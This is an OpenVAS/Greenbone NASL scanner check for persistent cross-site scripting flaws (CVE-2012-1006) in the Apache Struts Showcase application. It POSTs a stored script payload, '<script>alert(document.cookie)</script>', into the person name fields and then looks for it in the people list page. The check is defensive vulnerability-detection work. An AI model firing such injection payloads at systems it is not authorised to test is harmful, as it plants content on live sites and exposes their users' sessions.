CPE = "cpe:/a:apache:struts";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802422" );
	script_version( "2021-04-01T11:26:56+0000" );
	script_bugtraq_id( 51902 );
	script_cve_id( "CVE-2012-1006" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2021-04-01 11:26:56 +0000 (Thu, 01 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-02-08 12:14:38 +0530 (Wed, 08 Feb 2012)" );
	script_name( "Apache Struts < 2.3.3 Showcase Multiple Persistent XSS Vulnerabilities" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_apache_struts_consolidation.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "apache/struts/http/detected" );
	script_xref( name: "URL", value: "https://web.archive.org/web/20131013214245/http://secpod.org/blog/?p=450" );
	script_xref( name: "URL", value: "https://web.archive.org/web/20120430091758/http://secpod.org/advisories/SecPod_Apache_Struts_Multiple_Parsistant_XSS_Vulns.txt" );
	script_tag( name: "summary", value: "Apache Struts Showcase is prone to multiple persistent
  cross-site scripting (XSS) vulnerabilities." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP POST request and checks the
  response." );
	script_tag( name: "insight", value: "Multiple flaws exist due to:

  - Input passed via the 'name' and 'lastName' parameter in
  '/struts2-showcase/person/editPerson.action' is not properly verified before it is
  returned to the user.

  - Input passed via the 'clientName' parameter in '/struts2-rest-showcase/orders'
  action is not properly verified before it is returned to the user." );
	script_tag( name: "impact", value: "Successful exploitation could allow an attacker to
  execute arbitrary HTML code in a user's browser session in the context of a vulnerable
  application." );
	script_tag( name: "affected", value: "Apache Struts 1.3.10, 2.0.14, 2.2.3 and 2.3.1.2 are
  known to be affected." );
	script_tag( name: "solution", value: "Update to version 2.3.3 or later." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
req = http_get( item: dir + "/showcase.action", port: port );
res = http_keepalive_send_recv( port: port, data: req );
if(!res){
	exit( 0 );
}
if(ContainsString( res, ">Showcase</" ) && ContainsString( res, ">Struts Showcase<" )){
	postdata = "person.name=%3Cscript%3Ealert%28document.cookie%29%3C%2" + "Fscript%3E&person.lastName=%3Cscript%3Ealert%28document" + ".cookie%29%3C%2Fscript%3E";
	url = dir + "/person/newPerson.action";
	req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
	res = http_keepalive_send_recv( port: port, data: req );
	if(!res){
		exit( 0 );
	}
	url = dir + "/person/listPeople.action";
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "<script>alert(document.cookie)</script>" ) && ContainsString( res, ">Struts Showcase<" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
	exit( 99 );
}
exit( 0 );

